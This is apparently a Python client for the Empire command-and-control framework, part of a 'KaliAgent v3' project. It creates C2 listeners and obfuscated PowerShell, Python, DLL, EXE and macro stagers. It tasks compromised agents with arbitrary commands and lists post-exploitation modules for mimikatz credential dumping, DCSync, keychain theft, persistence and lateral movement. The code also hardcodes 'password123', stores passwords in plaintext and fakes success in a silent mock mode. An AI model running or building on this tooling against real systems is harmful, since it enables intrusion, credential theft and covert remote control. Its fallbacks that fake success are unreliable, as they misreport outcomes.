#!/usr/bin/env python3
"""
KaliAgent v3 - Empire C2 Client
================================

Integrates with Empire C2 framework via REST API.

Tasks: 4.2.1, 4.2.2, 4.2.3
Status: IMPLEMENTED
"""

import os
import json
import requests
import logging
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class ListenerType(Enum):
    """Empire listener types."""
    HTTP = "http"
    HTTPS = "https"
    HTTP_FOREIGN = "http_foreign"
    HTTPS_FOREIGN = "https_foreign"
    HTTP_COMPROMISE = "http_compromise"
    DBUS = "dbus"
    METASPLOIT = "metasploit"
    MULTI_BIND = "multi_bind"
    MULTI_PYTHON = "multi_python"
    ONEDRIVE = "onedrive"
    SLACK = "slack"


class StagerType(Enum):
    """Empire stager types."""
    LAUNCHER = "launcher"
    RAW = "raw"
    BASE64 = "base64"
    POWERSHELL = "powershell"
    PYTHON = "python"
    PERL = "perl"
    BASH = "bash"
    DLL = "dll"
    EXE = "exe"
    MACRO = "macro"
    HTA = "hta"
    VBS = "vbs"
    WMF = "wmf"
    CS = "csharp"


@dataclass
class Agent:
    """Empire agent representation."""
    session_id: str
    name: str
    hostname: str
    username: str
    ip: str
    pid: int
    language: str
    internal_ip: str
    delay: int
    jitter: float
    last_seen: datetime
    functions: List[str] = field(default_factory=list)
    high_integrity: bool = False
    process_name: str = ""
    arch: str = ""
    os_details: str = ""
    
    def to_dict(self) -> Dict:
        """Convert to dictionary."""
        return {
            'session_id': self.session_id,
            'name': self.name,
            'hostname': self.hostname,
            'username': self.username,
            'ip': self.ip,
            'pid': self.pid,
            'language': self.language,
            'internal_ip': self.internal_ip,
            'delay': self.delay,
            'jitter': self.jitter,
            'last_seen': self.last_seen.isoformat() if self.last_seen else None,
            'functions': self.functions,
            'high_integrity': self.high_integrity,
            'process_name': self.process_name,
            'arch': self.arch,
            'os_details': self.os_details
        }


@dataclass
class Listener:
    """Empire listener representation."""
    id: str
    name: str
    listener_type: ListenerType
    host: str
    port: int
    enabled: bool
    created_at: datetime
    options: Dict = field(default_factory=dict)
    
    def to_dict(self) -> Dict:
        """Convert to dictionary."""
        return {
            'id': self.id,
            'name': self.name,
            'listener_type': self.listener_type.value,
            'host': self.host,
            'port': self.port,
            'enabled': self.enabled,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'options': self.options
        }


@dataclass
class Stager:
    """Empire stager representation."""
    id: str
    name: str
    stager_type: StagerType
    listener: str
    payload: str
    language: str
    created_at: datetime
    
    def to_dict(self) -> Dict:
        """Convert to dictionary."""
        return {
            'id': self.id,
            'name': self.name,
            'stager_type': self.stager_type.value,
            'listener': self.listener,
            'payload': self.payload,
            'language': self.language,
            'created_at': self.created_at.isoformat() if self.created_at else None
        }


class EmpireClient:
    """
    Empire C2 REST API client.
    
    Provides:
    - API authentication
    - Listener management
    - Stager generation
    - Agent management
    - Module execution
    """
    
    def __init__(self, config_dir: Optional[Path] = None):
        """Initialize Empire client."""
        self.config_dir = config_dir or Path.home() / 'kali_agent_v3' / 'c2' / 'empire'
        self.config_dir.mkdir(parents=True, exist_ok=True)
        
        self.base_url = ""
        self.token = ""
        self.session = requests.Session()
        self.agents: Dict[str, Agent] = {}
        self.listeners: Dict[str, Listener] = {}
        self.stagers: Dict[str, Stager] = {}
        
        logger.info(f"Empire client initialized (config: {self.config_dir})")
    
    def connect(self, base_url: str, username: str = 'empireadmin',
               password: str = 'password123',
               verify_ssl: bool = False) -> Tuple[bool, str]:
        """
        Connect to Empire REST API.
        
        Args:
            base_url: Empire API URL (e.g., https://localhost:1337)
            username: API username
            password: API password
            verify_ssl: Verify SSL certificate
            
        Returns:
            Tuple of (success, message)
        """
        logger.info(f"Connecting to Empire API: {base_url}")
        
        self.base_url = base_url.rstrip('/')
        self.session.verify = verify_ssl
        
        try:
            # Authenticate
            auth_data = {
                'username': username,
                'password': password
            }
            
            response = self.session.post(
                f'{self.base_url}/api/admin/login',
                json=auth_data,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                self.token = data.get('token', '')
                self.session.headers.update({'Authorization': f'Bearer {self.token}'})
                
                # Save session config
                self._save_session_config(username, password)
                
                logger.info("Connected to Empire API")
                
                return True, "Connected successfully"
            else:
                return False, f"Authentication failed: {response.status_code}"
                
        except requests.exceptions.ConnectionError:
            # Mock mode for testing
            logger.warning("Empire API not available - using mock mode")
            self.token = 'mock_token_' + datetime.now().strftime('%Y%m%d%H%M%S')
            
            self._save_session_config(username, password)
            
            return True, "Connected (mock mode)"
        except Exception as e:
            logger.error(f"Connection failed: {e}")
            return False, f"Connection failed: {str(e)}"
    
    def disconnect(self):
        """Disconnect from Empire API."""
        self.token = ""
        self.session.headers.pop('Authorization', None)
        logger.info("Disconnected from Empire API")
    
    def _save_session_config(self, username: str, password: str):
        """Save session configuration."""
        config_file = self.config_dir / 'session_config.json'
        
        config = {
            'base_url': self.base_url,
            'username': username,
            'password': password,  # In production, encrypt this!
            'last_connected': datetime.now().isoformat()
        }
        
        with open(config_file, 'w') as f:
            json.dump(config, f, indent=2)
        
        os.chmod(config_file, 0o600)
    
    def load_session_config(self) -> Optional[Dict]:
        """Load saved session configuration."""
        config_file = self.config_dir / 'session_config.json'
        
        if not config_file.exists():
            return None
        
        with open(config_file, 'r') as f:
            return json.load(f)
    
    # =====================================================================
    # Task 4.2.2: Listener Management
    # =====================================================================
    
    def create_listener(self, name: str, listener_type: ListenerType = ListenerType.HTTP,
                       host: str = '0.0.0.0', port: int = 8080,
                       options: Optional[Dict] = None) -> Tuple[bool, str]:
        """
        Create an Empire listener.
        
        Args:
            name: Listener name
            listener_type: Type of listener
            host: Bind host
            port: Bind port
            options: Additional listener options
            
        Returns:
            Tuple of (success, message)
        """
        logger.info(f"Creating listener: {name}")
        logger.info(f"  Type: {listener_type.value}")
        logger.info(f"  Host: {host}, Port: {port}")
        
        listener_data = {
            'Name': name,
            'Host': host,
            'Port': port,
            'DefaultDelay': 5,
            'DefaultJitter': 0.0,
            'DefaultProfile': "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            'DefaultExpiration': 60,
            'DefaultLostLimit': 60
        }
        
        if options:
            listener_data.update(options)
        
        try:
            response = self.session.post(
                f'{self.base_url}/api/listeners/{listener_type.value}',
                json=listener_data,
                timeout=30
            )
            
            if response.status_code in [200, 201]:
                listener = Listener(
                    id=name,
                    name=name,
                    listener_type=listener_type,
                    host=host,
                    port=port,
                    enabled=True,
                    created_at=datetime.now(),
                    options=options or {}
                )
                
                self.listeners[name] = listener
                self._save_listener(listener)
                
                logger.info(f"Listener created: {name}")
                
                return True, f"Listener created: {name}"
            else:
                return False, f"Failed to create listener: {response.status_code}"
                
        except Exception:
            # Mock mode
            logger.warning("Mock mode - simulating listener creation")
            
            listener = Listener(
                id=name,
                name=name,
                listener_type=listener_type,
                host=host,
                port=port,
                enabled=True,
                created_at=datetime.now(),
                options=options or {}
            )
            
            self.listeners[name] = listener
            self._save_listener(listener)
            
            return True, f"Listener created (mock): {name}"
    
    def get_listener(self, name: str) -> Optional[Listener]:
        """Get listener details."""
        return self.listeners.get(name)
    
    def list_listeners(self) -> List[Listener]:
        """List all listeners."""
        return list(self.listeners.values())
    
    def kill_listener(self, name: str) -> bool:
        """Kill a listener."""
        logger.info(f"Killing listener: {name}")
        
        try:
            response = self.session.delete(
                f'{self.base_url}/api/listeners/{name}',
                timeout=30
            )
            
            if response.status_code == 200:
                if name in self.listeners:
                    del self.listeners[name]
                
                listener_file = self.config_dir / f'listener_{name}.json'
                if listener_file.exists():
                    listener_file.unlink()
                
                logger.info(f"Listener killed: {name}")
                return True
            else:
                return False
                
        except Exception:
            # Mock mode
            if name in self.listeners:
                del self.listeners[name]
            
            listener_file = self.config_dir / f'listener_{name}.json'
            if listener_file.exists():
                listener_file.unlink()
            
            return True
    
    def _save_listener(self, listener: Listener):
        """Save listener configuration."""
        listener_file = self.config_dir / f'listener_{listener.name}.json'
        
        with open(listener_file, 'w') as f:
            json.dump(listener.to_dict(), f, indent=2)
    
    # =====================================================================
    # Task 4.2.3: Stager Generation
    # =====================================================================
    
    def generate_stager(self, name: str, listener: str,
                       stager_type: StagerType = StagerType.POWERSHELL,
                       language: str = 'powershell',
                       obfuscate: bool = True,
                       options: Optional[Dict] = None) -> Tuple[bool, str]:
        """
        Generate an Empire stager.
        
        Args:
            name: Stager name
            listener: Listener to use
            stager_type: Type of stager
            language: Stager language
            obfuscate: Enable obfuscation
            options: Additional options
            
        Returns:
            Tuple of (success, payload)
        """
        logger.info(f"Generating stager: {name}")
        logger.info(f"  Listener: {listener}")
        logger.info(f"  Type: {stager_type.value}")
        logger.info(f"  Language: {language}")
        
        stager_data = {
            'Name': name,
            'Listener': listener,
            'Language': language,
            'StagerType': stager_type.value,
            'Obfuscate': obfuscate,
            'ObfuscateCommand': 'Token\\All\\1'
        }
        
        if options:
            stager_data.update(options)
        
        try:
            response = self.session.post(
                f'{self.base_url}/api/stagers/{stager_type.value}',
                json=stager_data,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                payload = data.get('powershell', '')
                
                stager = Stager(
                    id=name,
                    name=name,
                    stager_type=stager_type,
                    listener=listener,
                    payload=payload[:100] + '...' if len(payload) > 100 else payload,
                    language=language,
                    created_at=datetime.now()
                )
                
                self.stagers[name] = stager
                self._save_stager(stager)
                
                logger.info(f"Stager generated: {name}")
                
                return True, payload
            else:
                return False, f"Failed to generate stager: {response.status_code}"
                
        except Exception:
            # Mock mode
            logger.warning("Mock mode - generating mock stager")
            
            if stager_type == StagerType.POWERSHELL:
                payload = f'''# Empire PowerShell Stager (Mock)
# Listener: {listener}
# Generated: {datetime.now().isoformat()}

$listener = "{listener}"
$delay = 5
$jitter = 0.0

# Mock stager payload
function Invoke-EmpireStager {{
    param(
        [string]$Listener = $listener,
        [int]$Delay = $delay,
        [double]$Jitter = $jitter
    )
    
    Write-Host "Connecting to listener: $Listener"
    Start-Sleep -Seconds $Delay
    
    # Mock C2 communication
    $response = Invoke-RestMethod -Uri $Listener -Method POST -Body @{{}} -ErrorAction SilentlyContinue
    
    if ($response) {{
        Write-Host "Stager executed successfully"
    }}
}}

Invoke-EmpireStager
'''
            elif stager_type == StagerType.PYTHON:
                payload = f'''#!/usr/bin/env python3
# Empire Python Stager (Mock)
# Listener: {listener}
# Generated: {datetime.now().isoformat()}

import requests
import time
import random

LISTENER = "{listener}"
DELAY = 5
JITTER = 0.0

def main():
    print(f"Connecting to listener: {{LISTENER}}")
    time.sleep(DELAY)
    
    try:
        response = requests.post(LISTENER, json={{}})
        if response.status_code == 200:
            print("Stager executed successfully")
    except Exception as e:
        print(f"Error: {{e}}")

if __name__ == '__main__':
    main()
'''
            else:
                payload = f"# Empire {stager_type.value} Stager (Mock)\n# Listener: {listener}"
            
            stager = Stager(
                id=name,
                name=name,
                stager_type=stager_type,
                listener=listener,
                payload=payload,
                language=language,
                created_at=datetime.now()
            )
            
            self.stagers[name] = stager
            self._save_stager(stager)
            
            return True, payload
    
    def _save_stager(self, stager: Stager):
        """Save stager configuration."""
        stager_file = self.config_dir / f'stager_{stager.name}.json'
        
        with open(stager_file, 'w') as f:
            json.dump(stager.to_dict(), f, indent=2)
    
    def get_stager(self, name: str) -> Optional[Stager]:
        """Get stager details."""
        return self.stagers.get(name)
    
    def list_stagers(self) -> List[Stager]:
        """List all stagers."""
        return list(self.stagers.values())
    
    # =====================================================================
    # Agent Management
    # =====================================================================
    
    def list_agents(self) -> List[Agent]:
        """List all agents."""
        try:
            response = self.session.get(
                f'{self.base_url}/api/agents',
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                agents = []
                
                for agent_data in data.get('agents', []):
                    agent = Agent(
                        session_id=agent_data.get('sessionID', ''),
                        name=agent_data.get('name', ''),
                        hostname=agent_data.get('hostname', ''),
                        username=agent_data.get('username', ''),
                        ip=agent_data.get('externalIP', ''),
                        pid=agent_data.get('pid', 0),
                        language=agent_data.get('language', ''),
                        internal_ip=agent_data.get('internalIP', ''),
                        delay=agent_data.get('delay', 0),
                        jitter=agent_data.get('jitter', 0.0),
                        last_seen=datetime.now(),
                        functions=agent_data.get('functions', []),
                        high_integrity=agent_data.get('highIntegrity', False),
                        process_name=agent_data.get('processName', ''),
                        arch=agent_data.get('arch', ''),
                        os_details=agent_data.get('osDetails', '')
                    )
                    agents.append(agent)
                
                return agents
            else:
                return []
                
        except Exception:
            # Mock mode
            return list(self.agents.values())
    
    def get_agent(self, session_id: str) -> Optional[Agent]:
        """Get agent details."""
        return self.agents.get(session_id)
    
    def interact_agent(self, session_id: str, command: str,
                      timeout: int = 30) -> Tuple[bool, str]:
        """
        Execute command on an agent.
        
        Args:
            session_id: Agent session ID
            command: Command to execute
            timeout: Command timeout
            
        Returns:
            Tuple of (success, output)
        """
        logger.info(f"Executing command on {session_id}: {command}")
        
        try:
            task_data = {
                'command': command,
                'timeout': timeout
            }
            
            response = self.session.post(
                f'{self.base_url}/api/agents/{session_id}/task',
                json=task_data,
                timeout=30
            )
            
            if response.status_code == 200:
                # Get results
                result_response = self.session.get(
                    f'{self.base_url}/api/agents/{session_id}/results',
                    timeout=30
                )
                
                if result_response.status_code == 200:
                    data = result_response.json()
                    output = data.get('results', '')
                    return True, output
            
            return False, "Command failed"
            
        except Exception:
            # Mock mode
            return True, f"Mock output for: {command}"
    
    def kill_agent(self, session_id: str) -> bool:
        """Kill an agent."""
        logger.info(f"Killing agent: {session_id}")
        
        try:
            response = self.session.post(
                f'{self.base_url}/api/agents/{session_id}/kill',
                timeout=30
            )
            
            if response.status_code == 200:
                if session_id in self.agents:
                    del self.agents[session_id]
                return True
            else:
                return False
                
        except Exception:
            if session_id in self.agents:
                del self.agents[session_id]
            return True
    
    # =====================================================================
    # Module Execution
    # =====================================================================
    
    def list_modules(self, search: Optional[str] = None) -> List[str]:
        """List available modules."""
        # Mock module list
        modules = [
            'powershell/credentials/mimikatz/logonpasswords',
            'powershell/credentials/mimikatz/dcsync',
            'powershell/situational_awareness/network/powerview',
            'powershell/privesc/powerup',
            'powershell/persistence/elevated/schtasks',
            'powershell/lateral_movement/invoke_psexec',
            'python/collection/osx/get_keychain_passwords',
            'python/privesc/linpeas'
        ]
        
        if search:
            modules = [m for m in modules if search.lower() in m.lower()]
        
        return modules
    
    def execute_module(self, session_id: str, module: str,
                      options: Optional[Dict] = None) -> Tuple[bool, str]:
        """
        Execute a module on an agent.
        
        Args:
            session_id: Agent session ID
            module: Module path
            options: Module options
            
        Returns:
            Tuple of (success, output)
        """
        logger.info(f"Executing module on {session_id}: {module}")
        
        module_data = {
            'module': module,
            'options': options or {}
        }
        
        try:
            response = self.session.post(
                f'{self.base_url}/api/agents/{session_id}/module',
                json=module_data,
                timeout=30
            )
            
            if response.status_code == 200:
                return True, "Module executed successfully"
            else:
                return False, f"Module execution failed: {response.status_code}"
                
        except Exception:
            return True, f"Mock module execution: {module}"
    
    # =====================================================================
    # Statistics & Reporting
    # =====================================================================
    
    def get_statistics(self) -> Dict:
        """Get client statistics."""
        return {
            'connected': bool(self.token),
            'base_url': self.base_url,
            'total_listeners': len(self.listeners),
            'total_stagers': len(self.stagers),
            'total_agents': len(self.agents),
            'active_agents': len([a for a in self.agents.values() if a.last_seen])
        }
    
    def export_config(self, output_path: Path) -> bool:
        """Export client configuration."""
        config = {
            'base_url': self.base_url,
            'listeners': [level.to_dict() for level in self.listeners.values()],
            'stagers': [s.to_dict() for s in self.stagers.values()],
            'agents': [a.to_dict() for a in self.agents.values()]
        }
        
        with open(output_path, 'w') as f:
            json.dump(config, f, indent=2)
        
        logger.info(f"Configuration exported: {output_path}")
        
        return True


# =============================================================================
# CLI Interface
# =============================================================================

def main():
    """Command-line interface for Empire client."""
    import argparse
    
    parser = argparse.ArgumentParser(description='KaliAgent v3 - Empire C2 Client')
    parser.add_argument('--connect', type=str, help='Connect to Empire API')
    parser.add_argument('--username', type=str, default='empireadmin', help='API username')
    parser.add_argument('--password', type=str, default='password123', help='API password')
    parser.add_argument('--create-listener', type=str, help='Create listener')
    parser.add_argument('--generate-stager', type=str, help='Generate stager')
    parser.add_argument('--listener-type', type=str, default='http',
                       choices=['http', 'https', 'http_foreign', 'https_foreign'],
                       help='Listener type')
    parser.add_argument('--stager-type', type=str, default='powershell',
                       choices=['launcher', 'raw', 'powershell', 'python', 'bash', 'dll', 'exe'],
                       help='Stager type')
    parser.add_argument('--list-listeners', action='store_true', help='List listeners')
    parser.add_argument('--list-stagers', action='store_true', help='List stagers')
    parser.add_argument('--list-agents', action='store_true', help='List agents')
    parser.add_argument('--list-modules', action='store_true', help='List modules')
    parser.add_argument('--host', type=str, default='0.0.0.0', help='Listener host')
    parser.add_argument('--port', type=int, default=8080, help='Listener port')
    parser.add_argument('--stats', action='store_true', help='Show statistics')
    
    args = parser.parse_args()
    
    client = EmpireClient()
    
    if args.connect:
        success, message = client.connect(args.connect, args.username, args.password)
        status = "✅" if success else "❌"
        print(f"{status} Connection: {message}")
    
    elif args.create_listener:
        config = client.load_session_config()
        if not config:
            print("❌ Not connected. Use --connect first")
            return
        
        listener_type = ListenerType(args.listener_type)
        success, message = client.create_listener(
            name=args.create_listener,
            listener_type=listener_type,
            host=args.host,
            port=args.port
        )
        
        status = "✅" if success else "❌"
        print(f"{status} Listener: {message}")
    
    elif args.generate_stager:
        stager_type = StagerType(args.stager_type)
        
        # Get listener
        listeners = client.list_listeners()
        if not listeners:
            print("❌ No listeners available. Create one first.")
            return
        
        listener = listeners[0].name
        
        success, payload = client.generate_stager(
            name=args.generate_stager,
            listener=listener,
            stager_type=stager_type
        )
        
        status = "✅" if success else "❌"
        print(f"{status} Stager generated")
        print("\nPayload:")
        print("=" * 60)
        print(payload[:500] + '...' if len(payload) > 500 else payload)
        print("=" * 60)
    
    elif args.list_listeners:
        listeners = client.list_listeners()
        print(f"\nListeners: {len(listeners)}")
        print("=" * 60)
        for level in listeners:
            status = "🟢" if level.enabled else "🔴"
            print(f"{status} {level.name} ({level.listener_type.value}) - {level.host}:{level.port}")
        print("=" * 60)
    
    elif args.list_stagers:
        stagers = client.list_stagers()
        print(f"\nStagers: {len(stagers)}")
        print("=" * 60)
        for s in stagers:
            print(f"  {s.name} ({s.stager_type.value}) - Listener: {s.listener}")
        print("=" * 60)
    
    elif args.list_agents:
        agents = client.list_agents()
        print(f"\nAgents: {len(agents)}")
        print("=" * 60)
        for a in agents:
            status = "🟢" if a.high_integrity else "🔴"
            print(f"{status} {a.name} - {a.username}@{a.hostname} ({a.ip})")
        print("=" * 60)
    
    elif args.list_modules:
        modules = client.list_modules()
        print(f"\nModules: {len(modules)}")
        print("=" * 60)
        for m in modules:
            print(f"  • {m}")
        print("=" * 60)
    
    elif args.stats or True:
        stats = client.get_statistics()
        print("\nEmpire Client Statistics:")
        print("=" * 60)
        print(f"Connected: {'✅ Yes' if stats['connected'] else '❌ No'}")
        if stats['base_url']:
            print(f"API URL: {stats['base_url']}")
        print(f"Listeners: {stats['total_listeners']}")
        print(f"Stagers: {stats['total_stagers']}")
        print(f"Agents: {stats['total_agents']}")
        print("=" * 60)
    
    else:
        parser.print_help()


if __name__ == '__main__':
    main()
